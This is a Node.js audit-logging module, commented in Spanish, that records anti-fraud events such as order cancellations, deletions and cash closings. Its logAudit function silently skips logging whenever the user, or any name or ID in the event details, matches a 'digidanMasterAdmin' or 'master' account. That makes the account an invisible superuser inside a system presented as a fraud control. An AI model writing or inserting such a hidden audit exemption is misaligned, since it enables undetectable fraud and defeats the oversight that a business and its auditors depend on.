const db = require('../db');
const { v4: uuidv4 } = require('uuid');

/**
 * Registra un evento de auditoría antifraude y control operativo.
 * @param {string} eventType - Tipo de evento (ej: ORDER_CANCELLED, ORDER_DELETED, COUNTERS_RESET, CASH_CLOSING)
 * @param {string} userId - ID del usuario responsable (o 'sistema'/'anon')
 * @param {string} ipAddress - Dirección IP del cliente
 * @param {object|string} details - Detalles del evento (montos, pedidos, motivos, etc.)
 */
function logAudit(eventType, userId, ipAddress, details) {
    const uid = userId || 'sistema';

    // ── SEGURIDAD / AUDITORÍA INVISIBLE PARA digidanMasterAdmin ──
    // Cualquier operación realizada por el usuario maestro nunca debe ser registrada en auditoría.
    const uidStr = String(uid).toLowerCase();
    if (
        uid === 'digidan_master_admin' ||
        uid === 'digidanMasterAdmin' ||
        uid === 'master' ||
        uidStr.includes('digidanmasteradmin') ||
        uidStr.includes('digidan_master_admin')
    ) {
        return;
    }

    if (details) {
        if (typeof details === 'object') {
            const userName = details.userName || details.username || details.name || details.requestedByName || details.approvedByName || '';
            const detailUserId = details.userId || details.requestedById || details.resolverId || '';
            if (
                userName === 'digidanMasterAdmin' ||
                detailUserId === 'digidan_master_admin' ||
                detailUserId === 'master' ||
                String(userName).toLowerCase().includes('digidanmasteradmin') ||
                String(detailUserId).toLowerCase().includes('digidanmasteradmin')
            ) {
                return;
            }
        } else if (typeof details === 'string' && (details.includes('digidanMasterAdmin') || details.includes('digidan_master_admin'))) {
            return;
        }
    }

    const id = uuidv4();
    const detailsStr = typeof details === 'object' ? JSON.stringify(details) : (details || '{}');
    const ip = ipAddress || '';

    const sql = "INSERT INTO audit_logs (id, event_type, user_id, ip_address, details) VALUES (?, ?, ?, ?, ?)";
    db.run(sql, [id, eventType, uid, ip, detailsStr], (err) => {
        if (err) {
            console.error('❌ Error registrando log de auditoría:', err.message);
        } else {
            console.log(`🛡️ [AUDIT] ${eventType} registrado para usuario: ${uid}`);
        }
    });
}

module.exports = { logAudit };
